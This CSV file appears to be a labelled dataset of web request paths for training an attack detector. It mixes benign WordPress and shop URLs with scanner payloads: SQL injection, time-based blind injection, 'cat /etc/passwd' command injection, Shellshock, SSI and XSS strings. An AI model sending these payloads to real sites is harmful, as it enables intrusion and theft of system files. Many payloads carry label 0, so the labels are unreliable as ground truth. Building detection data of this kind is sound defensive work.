text,label
/blog/wp-content/plugins/%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C/assets,0
/blog/index.php%7Ccat+%2Fetc%2Fpasswd%23/tag/hic-enim-consequatur-minima-quibusdam-magnam/feed,0
/blog/wp-content/uploads/HtTpS%3A%2F%2F8501779237819759495.owasp.org/04/814f0d47-97c4-3681-b8a4-2cd7f3a93119.jpg,0
/visa_electron/,0
/blog/index.php/2020/04/04/ipsa-ea-porro-distinctio/embed%27%3Bsleep+15%3B%27,1
/blog/index.php%22+OR+%221%22%3D%221/page/3?s,1
/blog/wp-content/plugins/user-registration/assets/js/admin/backbone-modal.min.js?ver=1.8.2.1,0
/blog/registration%27%3Bcat+%2Fetc%2Fpasswd%3B%27,0
/blog/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia/embed%25%27%29+ORDER+BY+1%23,0
/blog/index.php/author/rosenbaum-lisette%22%29+UNION+ALL+select+NULL+--+,1
/blog/index.php/2020/03%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/27/qui-ratione-maxime-dolores-consequatur/feed,1
/blog/index.php/author/rosenbaum-lisette%27+or+0+in+%28select+sleep%2815%29+%29+--+/feed,1
/blog/wp-content/uploads/2020/04_backup/4eb284d3-cf2e-320a-949c-44cf6c5433a9.jpg,0
/blog/wp-content/uploads/8501779237819759495.owasp.org/04/f51dfb19-3fe8-380e-91a6-3912fdae661e.jpg,0
/blog%26%26cat+%2Fetc%2Fpasswd/index.php/page/2,0
/blog/wp-includes/css/admin-bar.min.css?ver=HtTp%3A%2F%2F8501779237819759495.owasp.org,0
"/blog/wp-admin%22+AND+%221%22%3D%221%22+--+/load-styles.php?c=0&dir=ltr&load%5B%5D=dashicons,buttons,forms,l10n,login&ver=4.9.5",1
"1%"") procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (""%""=""",1
/blog/HtTp%3A%2F%2F8501779237819759495.owasp.org/uploads/2020/04/814f0d47-97c4-3681-b8a4-2cd7f3a93119.jpg,0
/c%3A%5C/wp-includes/js/imgareaselect,0
/blog/wp-admin/load-styles.php?c=0&dir=ltr&load%5B%5D=http%3A%2F%2F8501779237819759495.owasp.org&ver=4.9.5,0
/blog/wp-includes/js/jquery/http%3A%2F%2F8501779237819759495.owasp.org/mouse.min.js?ver=1.11.4,0
/blog/%5D%5D%3E/uploads/2020/04/e3780f73-5198-35c8-8ece-d2d4feda884e.jpg,1
/blog/index.php/2020/04%22+AND+%221%22%3D%221%22+--+/04/rerum-soluta-et-quis-excepturi-labore/feed,1
/blog/wp-content/uploads/2020/04%27+where+0+in+%28select+sleep%2815%29+%29+--+/4b6aa405-8ac7-33d8-9366-43fcef53f97a.png,1
/blog/index.php/2020/04/04%7C%7Ccat+%2Fetc%2Fpasswd/explicabo-qui-fuga-distinctio-dolores-voluptatibus-sit/feed,0
/tutorialsflash/,0
/blog/wp-content/plugins/user-registration/%2B/js/frontend/user-registration.min.js?ver=1.8.2.1,0
/blog/index.php%22%3Bcat+%2Fetc%2Fpasswd%3B%22/author/vbechtelar,0
/blog/index.php%22%3Bcat+%2Fetc%2Fpasswd%3B%22/search/feed/feed,0
/blog/%2F%2F8501779237819759495.owasp.org/vitae-dolores-quidem-possimus-aut-voluptatibus,0
/blog/index.php%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/2020/03/23/fuga-aut-recusandae-sed-dolor-quia/embed,1
/blog%27%3Bsleep+15%3B%27/wp-content/uploads/2020/04/65521cc1-512f-3af5-a40c-ad52a8de6f29.png,1
/blog/https%3A%2F%2F8501779237819759495.owasp.org/sample-page/feed,0
mcavoy-zabczynski@discotecateatre.gt,0
/blog/0W45pz4p/my-account/edit-profile/%7B%7B%20data.sizes.medium.url,0
58,0
/blog/index.php/tag/sapiente-blanditiis-quasi/feed%3Bcat+%2Fetc%2Fpasswd%3B,0
/blog/index.php/nihil-dolorem-molestiae-recusandae-corrupti-qui-alias/embed%22%3Bcat+%2Fetc%2Fpasswd%3B%22,0
/blog/NULL/uploads/2020/04/b476e717-efec-3b0d-80e9-13c6400a7702-300x240.png,1
/blog/index.php/2020%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/03/22/quidem-rerum-sit-doloribus-quia-eum/embed,1
/blog/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur%22+UNION+ALL+SELECT+NULL%2CNULL--+-/embed,1
/blog/wp-content/http%3A%2F%2F8501779237819759495.owasp.org/2020/04/40ce1958-204f-369e-bc5a-32d63da4963f-300x240.png,0
/blog%29+UNION+ALL+select+NULL+--+/index.php/2020/03/27,1
/blog/HtTp%3A%2F%2F8501779237819759495.owasp.org/nihil-dolorem-molestiae-recusandae-corrupti-qui-alias/feed,0
/blog/index.php/2020/http%3A%2F%2F8501779237819759495.owasp.org/04/hic-porro-nihil-non-rerum/embed,0
/blog/wp-includes/js%27%22,1
/blog/index.php/2020/03/22%29%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/quidem-rerum-sit-doloribus-quia-eum,1
/%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C/index.php/2020/04/04/labore-pariatur-amet-quam/embed,0
/blog/%28/uploads/2020/04/aa129ea8-5161-37b5-acab-9d6386eeec9c.png,1
/blog/index.php/2020/03%29+ORDER+BY+1--+-/23,1
/blog/wp-content/themes/twentyseventeen/assets%7C%7Ccat+%2Fetc%2Fpasswd/js/global.js?ver=1.0,0
/blog/wp-content/uploads/2020/04%27+%2F+sleep%2815%29+%2F+%27/914665e4-4fbd-3377-9747-d24ebaabf676.png,0
/blog/wp-includes/js/imgareaselect%20-%20Copy%20(2)/imgareaselect.css,0
/blog/wp-admin/about.php.exe,0
/blog%22+where+0+in+%28select+sleep%2815%29+%29+--+/index.php/tag/at-quos-nesciunt-in-amet/feed,1
/blog/wp-content/plugins/user-registration/assets/%2Fetc%2Fpasswd/sweetalert2/sweetalert2.min.css?ver=8.17.1,0
/blog/index.php/2020/https%3A%2F%2F8501779237819759495.owasp.org/04/nihil-tenetur-et-ad-in-dolores/feed,0
/blog/index.php%27%29+AND+EXTRACTVALUE%287196%2CCONCAT%280x5c%2C0x3a727a613a%2C%28SELECT+%28ELT%287196%3D7196%2C1%29%29%29%2C0x3a6172743a%29%29+AND+%28%27emem%27%3D%27emem/2020/03/27,1
/recordings/check_user_id.php?user_id=<script>foo</script>,1
sagaceta farell,0
/%2Fb476e717-efec-3b0d-80e9-13c6400a7702.png/wp-content/uploads/2020/04/b476e717-efec-3b0d-80e9-13c6400a7702.png,0
/blog/index.php/%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fsleep+15/04/04/explicabo-qui-fuga-distinctio-dolores-voluptatibus-sit/embed,0
/blog/index.php%26cat%24jj+%24jj%2Fetc%24jj%2Fpasswd%26/2020,0
/blog/index.php/2020/04/04/rerum-soluta-et-quis-excepturi-labore%22+OR+%221%22%3D%221%22+--+/feed,1
/%2B/wp-content/uploads/2020/04/c357e14e-0af5-317e-a4f7-bc609b90087b.jpg,0
/blog/wp-content%22+and+0+in+%28select+sleep%2815%29+%29+--+/plugins/user-registration/assets,1
/blog/wp-content/uploads/2020%27+UNION+ALL+select+NULL+--+/04/b476e717-efec-3b0d-80e9-13c6400a7702.png,1
/blog/wp-content/uploads/2020/HtTp%3A%2F%2F8501779237819759495.owasp.org/48cf902e-a565-3e60-8512-c19e2e6a72db-300x200.jpg,0
/blog/index.php+OR+1%3D1/aliquam-odio-a-labore-magnam-quam-quis/embed,1
/embed/index.php/2020/04/04/hic-porro-nihil-non-rerum/embed,0
/blog/wp-content/uploads/2020%27+and+0+in+%28select+sleep%2815%29+%29+--+/04/ca053e21-2e95-34b7-a64b-a8ef08169a27-1024x682.jpg,1
/blog/index.php/my-account/%2522%253E%253C%2521--%2523EXEC%2Bcmd%253D%2522ls%2B%252F%2522--%253E%253C/%7B%7B%20data.sizes.medium.url%20%7D%7D,1
/blog/index.php/2020+RLIKE+%28SELECT+%28CASE+WHEN+%282916%3D8756%29+THEN+2020+ELSE+0x28+END%29%29/03/27/qui-ratione-maxime-dolores-consequatur,1
/HtTp%3A%2F%2F8501779237819759495.owasp.org/index.php/qui-enim-sunt-minima-sit,0
/blog/%5D%5D%3E/author/rosenbaum-lisette/feed,1
/blog/wp-comments-post.php comment=&submit=Post+Comment+ASC++--+&comment_post_ID=56&comment_parent=0,0
/blog/wp-content/uploads/2020%22%26sleep+15%26%22/04/c88a75c6-b439-3e82-99dd-0aca7c568b15-1024x682.jpg,1
/blog/index.php/rerum-ut-error-ex-dolores-rerum+ASC++--+/feed,1
/blog%27%26cat+%2Fetc%2Fpasswd%26%27/wp-login.php?reauth=1&redirect_to=http%3A%2F%2Ftest-site.com%2Fblog%2Fwp-admin%2Fprofile.php,0
/blog/index.php0W45pz4p/porro-corrupti-cupiditate-neque-fugit-aperiam-exercitationem/embed,0
/win98_tz/,0
/blog/index.php/2020+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/03/29,1
/blog/wp-includes/js/admin-bar.min.js?ver=http%3A%5C%5C8501779237819759495.owasp.org,0
/blog/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur+UNION+ALL+SELECT+NULL--+-/embed,1
esther,0
/blog/%2B/uploads/2020/04/6b2fa1b9-c963-3881-90e3-4f13ffe1c2d3-1024x682.jpg,0
/blog/wp-includes/js/mediaelement.tar,0
/blog%22+where+0+in+%28select+sleep%2815%29+%29+--+/index.php/my-account/edit-profile/post.php?action=edit&post=%7B%7B%20data.id%20%7D%7D,1
/blog/wp-includes/js/jquery/ui/sortable.min.js%22%3Bsleep+15%3B%22?ver=1.11.4,1
/blog/wp-content/%2Fjquery.validate.min.js/user-registration/assets/js/frontend/jquery.validate.min.js?ver=1.15.1,0
/blog/wp-includes/css/media-views.min.css?ver=4.9.5,0
/blog/wp-content/uploads/2020/%2Fetc%2Fpasswd/e3780f73-5198-35c8-8ece-d2d4feda884e.jpg,0
/sitemap.xml/,0
/%7C/index.php/wp-json,0
/blog/index.php/wp-json/https%3A%5C%5C8501779237819759495.owasp.org,0
/blog/index.php/2020/page/2%28,1
/%2B/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia/feed,0
/blog/wp-content/http%3A%2F%2F8501779237819759495.owasp.org/2020/04/cropped-587d69f7-b2e2-363b-b76a-5fd0bcf0c834-1-180x180.jpg,0
/blog%2527%2B%252F%2Bsleep%252815%2529%2B%252F%2B%2527/index.php/my-account/edit-profile/%7B%7B%20data.url%20%7D%7D,1
/blog/wp-content%3Bcat+%2Fetc%2Fpasswd%3B/uploads/2020/04/914665e4-4fbd-3377-9747-d24ebaabf676-300x240.png,0
/%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fsleep+15/index.php/sample-page/ut-aspernatur-est-dolores/feed,0
"/tienda1/publico/registro.jsp?modo=registro&login=@40&password=enar0ar&nombre=marcia&apellidos=porteria+estades&email=merkinson@pintandomucho.gg&dni=05145490e&direccion=calle+belateko+monasterioaren,+192,+2?e&ciudad=alcal�+del+obispo&cp=03794&provincia=valencia&ntc=1153905778243481&b1=registrar",1
/tienda1/publico/caracteristicas.jsp/asf-logo-wide~,1
/blog/index.php/0W45pz4p/ut-aspernatur-est-dolores/embed,0
/blog/wp-content/uploads/2020/04%27+OR+%271%27%3D%271%27+--+/ff237aac-eda3-37f9-8529-2cbfc90951b2-1024x682.jpg,1
/websense/,0
/HtTpS%3A%2F%2F8501779237819759495.owasp.org/index.php/2020/04/04/ipsa-repellat-dignissimos-laudantium/embed,0
/blog/index.php/2020/03/22%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/quidem-rerum-sit-doloribus-quia-eum,1
/blog%22%3Bcat+%2Fetc%2Fpasswd%3B%22/wp-content/plugins/user-registration/assets/css/sweetalert2/sweetalert2.min.css?ver=8.17.1,0
/%40/index.php/2020/04/04/tempore-odit-cupiditate-voluptas-laudantium-et-facilis/embed,0
/blog/index.php%29+PROCEDURE+ANALYSE%28EXTRACTVALUE%288176%2CCONCAT%280x5c%2C0x3a727a613a%2C%28SELECT+%28CASE+WHEN+%288176%3D8176%29+THEN+1+ELSE+0+END%29%29%2C0x3a6172743a%29%29%2C1%29+AND+%282127%3D2127/2020/03/27/qui-ratione-maxime-dolores-consequatur,1
/blog/index.php/2020/03/29%25%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/blog/index.php/2020//04/tempore-odit-cupiditate-voluptas-laudantium-et-facilis/feed,0
/blog/index.php/2020/%2F/29/distinctio-sequi-officiis-occaecati/feed,0
/blog/index.php/2020/03/27%22+RLIKE+%28SELECT+%28CASE+WHEN+%289041%3D9434%29+THEN+27+ELSE+0x28+END%29%29+AND+%22jVtG%22%3D%22jVtG/qui-ratione-maxime-dolores-consequatur/feed,1
/tienda1/publico/autenticar.jsp?modo=entrar&login=bergstro3&pwd=fic1r&remember=off&b1=entrar,0
/blog/%5C%5C8501779237819759495.owasp.org/my-account/edit-password,0
/blog/wp-content/themes/twentyseventeen/assets/css.0,0
/blog/index.php/2020/03+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/22/quidem-rerum-sit-doloribus-quia-eum/embed,1
/blog/index.php/author/vtromp/feed%22+AND+%221%22%3D%222,1
/blog/index.php%7C%7Ccat+%2Fetc%2Fpasswd/2020/04/04/animi-sint-ut-sed-commodi,0
/blog/index.php/my-account%25/edit-profile?mode=grid username=worriedBaboon6&password=&7b4O&&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2F%3Fmode%3Dgrid&login=Login&redirect=&rememberme=forever,0
/blog/wp-content/uploads.bac,0
/blog/index.php/2020/04/%2Fetc%2Fpasswd/ipsa-repellat-dignissimos-laudantium/embed,0
/blog%7C%7Csleep+15/wp-content/uploads/2020/04/48cf902e-a565-3e60-8512-c19e2e6a72db.jpg,1
/blog/wp-includes%7C%7Ccat+%2Fetc%2Fpasswd/js/shortcode.min.js?ver=4.9.5,0
/blog/index.php/2020/04/04%25%27++--+/ipsa-repellat-dignissimos-laudantium,1
/blog/wp-includes/js/imgareaselect/imgareaselect.css%22+or+0+in+%28select+sleep%2815%29+%29+--+?ver=0.9.8,1
/blog+AND+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29Ozoh%29--+duKW/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum,1
/blog/wp-content/plugins/user-registration/assets%27%3Bcat+%2Fetc%2Fpasswd%3B%27/js/frontend/my-account.min.js?ver=1.8.2.1,0
/blog/index.php/%5C%5C8501779237819759495.owasp.org/04/04/inventore-asperiores-adipisci-cum-facere-voluptatem-rerum/feed,0
/tienda1/publico/pagar.jsp?modo=insertar&precio=3213&b1=pasar+por+caja,0
/blog/index.php/page/4+UNION+ALL+select+NULL+--+?s,1
<script>alert(1)<!–,1
/fragtest/,0
/blog%26%26sleep+15/index.php/2020/04/04/hic-porro-nihil-non-rerum/embed,1
/blog/index.php/2020%25%27%29+ORDER+BY+1%23/03/22/quidem-rerum-sit-doloribus-quia-eum/feed,0
/blog/wp-content/uploads/2020/%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E/914665e4-4fbd-3377-9747-d24ebaabf676.png,0
/blog/index.php/sample-page/ut-aspernatur-est-dolores/embed%29,1
/blog/index.php/etc%2Fpasswd/nulla-quisquam-est-ut-nemo/embed,0
/blog/wp-includes/js/plupload/wp-plupload.min.js?ver=4.9.5+ASC++--+,1
"/tienda1/publico/registro.jsp?modo=registro&login=seale&password=sagradamente&nombre=kaya&apellidos=urpi+gallar&email=rangei@am-si.jo&dni=33581223g&direccion=covadonga,+69+3?e&ciudad=torres&cp=39697&provincia=ciudad+real&ntc=2918941228839292&b1=registrar",0
/blog%26%26cat+%2Fetc%2Fpasswd/wp-includes/css/dashicons.min.css?ver=4.9.5,0
/blog/wp-includes/js/jquery/ui/sortable.min.~bk,0
/blog/%2B/my-account username=excludedChowder9&password=#jvYSH9M&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2F&login=Login&redirect=&rememberme=forever,0
valverde de los arroyos,0
/blog/wp-content/%2Fetc%2Fpasswd/twentyseventeen/assets/js/html5.js?ver=3.7.3,0
/blog/index.php/search/suggestion/feed%7C%7Ccat+%2Fetc%2Fpasswd,0
/blog/index.php/wp-json/oembed/1.0/embed?format=zApPX1589sS&url=http%3A%2F%2Ftest-site.com%2Fblog%2Findex.php%2Fvitae-dolores-quidem-possimus-aut-voluptatibus%2F,0
/blog%26cat+%2Fetc%2Fpasswd%26/wp-content/uploads/2020/04/914665e4-4fbd-3377-9747-d24ebaabf676.png,0
/blog/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/feed%25%27%3BSELECT+SLEEP%285%29%23,0
/blog/wp-content/uploads/2020%27%22/04/7c651b11-3631-3f9e-b728-dc11efe811c7-300x240.png,1
/blog/index.php/qui-enim-sunt-minima-sit/https%3A%2F%2F8501779237819759495.owasp.org,0
/blog%27%29%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL--+-/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur/embed,1
/blog/index.php%29+AND+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29PEBr%29+AND+%283832%3D3832/2020/03/29/distinctio-sequi-officiis-occaecati,1
/blog/index.php/2020%27+where+0+in+%28select+sleep%2815%29+%29+--+/04/04/inventore-asperiores-adipisci-cum-facere-voluptatem-rerum/feed,1
/blog%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/index.php/2020/03/29/distinctio-sequi-officiis-occaecati/embed,1
/blog/index.php%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/2020/03/27/qui-ratione-maxime-dolores-consequatur/feed,1
/blog/index.php/2020/04/04%27+%2F+sleep%2815%29+%2F+%27/animi-sint-ut-sed-commodi/embed,0
/blog/wp-content/uploads/2020/04%27%3Bcat+%2Fetc%2Fpasswd%3B%27/cropped-587d69f7-b2e2-363b-b76a-5fd0bcf0c834-1-180x180.jpg,0
/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precioa=85&cantidad=79&b1=a�adir+al+carrito,1
/blog/index.php/est-reiciendis-laboriosam-aperiam-adipisci-non/?-s,0
/blog/index.php/etc%2Fpasswd/page/2,0
/blog/wp-content/uploads%22+where+0+in+%28select+sleep%2815%29+%29+--+/2020/04/48cf902e-a565-3e60-8512-c19e2e6a72db-300x200.jpg,1
/blog/8501779237819759495.owasp.org/js/wp-util.min.js?ver=4.9.5,0
/blogNULL/wp-content/uploads/2020/04/7eb06ef2-3782-3e6a-bb62-c705e86b2eee-300x200.jpg,1
/blog/c%3A%2F/2020/04/04/ipsa-ea-porro-distinctio/embed,0
/blog/wp-includes/%40/media-views.min.css?ver=4.9.5,0
/blog%25%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/embed,1
/blog%22+%2F+sleep%2815%29+%2F+%22/index.php/2020/04/04/rerum-soluta-et-quis-excepturi-labore/embed,0
/blog/index.php/my-account/edit-password/ password_current=&oF&y&password_1=&oF&y&password_2=&oF&y&_wpnonce=b9dad6a8b5&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=Save+changes%27+OR+%271%27%3D%271%27+--+&action=save_change_password,1
/blog/c%3A%2F/author/barton03/feed,0
/blog/wp-content/plugins/user-registration/assets/js/http%3A%2F%2F8501779237819759495.owasp.org/jquery.inputmask.bundle.min.js?ver=4.0.0-beta.58,0
/blog/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur%22%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL--+-,1
/blog/wp-content/uploads/2020/04%22%3Bcat+%2Fetc%2Fpasswd%3B%22/bdffa507-6fa1-380b-b720-116dfaf00c82-1024x682.jpg,0
/blog/index.php/2020/03%22%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/23,1
/blog/7eb06ef2-3782-3e6a-bb62-c705e86b2eee-300x200.jpg/uploads/2020/04/7eb06ef2-3782-3e6a-bb62-c705e86b2eee-300x200.jpg,0
/blog/index.php/2020%27%29+RLIKE+%28SELECT+%28CASE+WHEN+%287881%3D7881%29+THEN+2020+ELSE+0x28+END%29%29+AND+%28%27ipDd%27+LIKE+%27ipDd/03/27,1
/blog/%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E/themes/twentyseventeen/assets/js/global.js?ver=1.0,0
/clintonc/,0
/blog/wp-content/uploads/2020/04%3Bcat+%2Fetc%2Fpasswd%3B/02020950-6e37-3272-9dbf-3093969e3563-300x200.jpg,0
/blog/index.php/2020%25%27%29+PROCEDURE+ANALYSE%28EXTRACTVALUE%285405%2CCONCAT%280x5c%2C0x3a727a613a%2C%28SELECT+%28CASE+WHEN+%285405%3D5405%29+THEN+1+ELSE+0+END%29%29%2C0x3a6172743a%29%29%2C1%29+AND+%28%27%25%27%3D%27/03/22/quidem-rerum-sit-doloribus-quia-eum/feed,1
/blog/wp-includes/js/jquery/ui%28/core.min.js?ver=1.11.4,1
//index.php/et-vel-qui-explicabo-autem-rerum-nisi,0
/press3/,0
/blog/Set-cookie%3A+Tamper%3D6eb1e6ef-a332-4716-897d-f72d29c12000/2020/04/04/tempore-odit-cupiditate-voluptas-laudantium-et-facilis/embed,0
"/tienda1/publico/registro.jsp?modo=registro&login=paulo&password=l74i39i3&nombre=walkiria&apellidos=peret+gual&email=gifford@andropit.to&dni=69891802t&direccion=esglesia+romanica,+3+&ciudad=palas+de+rei&cp=46132&provincia=valencia&ntc=9738095206140190&b1=registrar",0
get http://localhost:8080.java http/1.1,1
"<meta http-equiv=set-cookie content=""testyglc=8988"">",1
/%00/index.php/2020/page/2,0
/blog/index.php%26%26cat+%2Fetc%2Fpasswd/search/technology,0
/blog/index.php/my-account/lost-password/ user_login=kindCrane2&ur_reset_password=true&_wpnonce=4b87c6adf6&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Flost-password%2F,0
/blog/wp-content/uploads/2020/04/f6fqm31a99houbp9sj4rbul9j87dto39dkdpm4va,0
/blog/index.php/etc%2Fpasswd/04/04/nihil-tenetur-et-ad-in-dolores/feed,0
/blog%27%26cat+%2Fetc%2Fpasswd%26%27/index.php/2020/04/04/hic-porro-nihil-non-rerum/embed,0
/blog/%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fsleep+15/themes/twentyseventeen/assets,0
/blog/wp-comments-post.php comment=&author=cockySnipe6&email=foo-bar%40example.com&url=http%3A%2F%2Fwww.example.com&submit=Post+Comment&comment_post_ID=11&comment_parent=0,0
/blog/wp-content/uploads/2020/04/zApPX2156sS,0
/blog/index.php%26%26sleep+15/2020/04/page,1
/blog/wp-includes/css/dashicons.min.css%27+AND+%271%27%3D%271%27+--+?ver=4.9.5,1
/blog%2BUNION%2BALL%2Bselect%2BNULL%2B--%2B/index.php/my-account/edit-profile/%7B%7B%20data.model.url%20%7D%7D,1
/blog/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur%25%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/feed,1
/blog/index.php/wp-json%22%26sleep+15%26%22/oembed/1.0/embed?format=xml&url=http%3A%2F%2Ftest-site.com%2Fblog%2Findex.php%2Fvitae-dolores-quidem-possimus-aut-voluptatibus%2F,0
//index.php/registration,0
/blog/wp-content/uploads/2020/%2F%2F8501779237819759495.owasp.org/02020950-6e37-3272-9dbf-3093969e3563-300x200.jpg,0
/blog/index.php/2020%7Ccat+%2Fetc%2Fpasswd%23/04/04/nihil-tenetur-et-ad-in-dolores/embed,0
/techcert01/,0
/blog/index.php/2020/04/04/page%22+%2F+sleep%2815%29+%2F+%22,0
/blog/index.php/2020/04/04/nihil-tenetur-et-ad-in-dolores%22%26cat+%2Fetc%2Fpasswd%26%22/embed,0
/NULL/index.php/2020/04,1
/blog/index.php/my-account/edit-profile/%7B%7B+data.size.url%22%26cat+%2Fetc%2Fpasswd%26%22,0
/blog/HtTp%3A%2F%2F8501779237819759495.owasp.org/themes/twentyseventeen/assets/js/skip-link-focus-fix.js?ver=1.0,0
/blog/wp-includes/js/jquery/ui%26%26sleep+15/core.min.js?ver=1.11.4,1
/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico&precio=85&cantidad=77&b1=a�adir+al+carrito,0
/%40/index.php/2020/04/04/vero-nihil-nam-numquam-ullam-quas,0
/blog/%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C/search/imagination/feed,0
/blog/wp-admin/profile.php.exe,0
/blog/%2Fregistration/registration,0
/blog/index.php%26%26cat+%2Fetc%2Fpasswd/author/vtromp,0
/blog%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia,1
/blog/index.php%22%26cat+%2Fetc%2Fpasswd%26%22/2020/04/04/ipsa-repellat-dignissimos-laudantium/feed,0
/https%3A%5C%5C8501779237819759495.owasp.org/index.php/fugiat-recusandae-voluptatem-ratione-quo-placeat/embed,0
/blog/%22/uploads/2020/04/11020b88-e0d1-33fa-b269-b7e9f495b02b.jpg,1
/https%3A%5C%5C8501779237819759495.owasp.org/index.php/my-account/edit-profile profile-pic-url=&profile-default-image=http%3A%2F%2F1.gravatar.com%2Favatar%2F14d5b5665405f8accb4e5f2fa274cd44%3Fs%3D96%26d%3Dmm%26r%3Dg&profile-pic=test_file.txt&user_registration_first_name=rafael&user_registration_user_login=rafael&user_registration_last_name=gracia&user_registration_user_email=rafael%40gmail.com&_wpnonce=5c88b58e23&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2F&save_account_details=Save+changes&action=save_profile_details,0
bain@raullazaro.pm,0
